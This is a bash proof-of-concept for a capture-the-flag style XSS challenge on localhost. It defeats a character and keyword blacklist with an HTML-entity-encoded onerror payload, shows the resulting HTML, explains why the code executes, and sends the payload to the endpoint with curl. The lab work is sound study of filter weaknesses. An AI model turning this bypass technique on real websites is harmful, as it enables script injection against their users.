#!/bin/bash
# XSS Challenge 20 - Blacklist Bypass POC

echo "===== XSS Challenge 20 - Blacklist Bypass POC ====="
echo ""

TARGET="http://localhost:5001/xss20"
PAYLOAD='" onerror="alert&#x28;1&#x29;'

echo "[*] Endpoint: $TARGET"
echo "[*] Blacklist: <, >, (, ), throw, backtick, javascript"
echo "[*] Bypass Payload: $PAYLOAD"
echo ""

# URL encode
URL_ENCODED=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$PAYLOAD'))")
echo "[*] URL Encoded: $URL_ENCODED"
echo ""

# Test with Python script
python3 << 'PYTHON'
msg = '" onerror="alert&#x28;1&#x29;'
blacklist = ['<', '>', '(', ')', 'throw', '`', '´', 'javascript']

print("[+] Filter Validation:")
all_pass = True
for word in blacklist:
    result = "FOUND" if word in msg.lower() else "OK"
    if word in msg.lower():
        all_pass = False
    symbol = "✓" if word not in msg.lower() else "✗"
    print(f"    {symbol} '{word}': {result}")

print("")
if all_pass:
    print("[+] PAYLOAD PASSES ALL FILTER CHECKS!")
else:
    print("[-] Payload blocked")
print("")

# Show generated HTML
value = '><img src="{0}"'.format(msg)
html = '<input type=text name=name placeholder="Enter your name..." {}>'.format(value)
print("[+] Generated HTML:")
print(f"    {html}")
print("")

print("[+] Execution Flow:")
print("    1. User sends: " + msg)
print("    2. Filter checks: No <, >, (, ), throw, `, ´, or javascript found")
print("    3. HTML renders: Browser decodes &#x28; to ( and &#x29; to )")
print("    4. Final HTML: onerror=\"alert(1)\"")
print("    5. Image fails to load: src=\"\" is empty")
print("    6. onerror event triggers")
print("    7. JavaScript executes: alert(1)")
PYTHON

# Test endpoint
echo "[*] Testing endpoint..."
curl -s -o /dev/null -w "HTTP Response Code: %{http_code}\n" "$TARGET?name=$URL_ENCODED"
echo ""
echo "[+] POC Complete!"
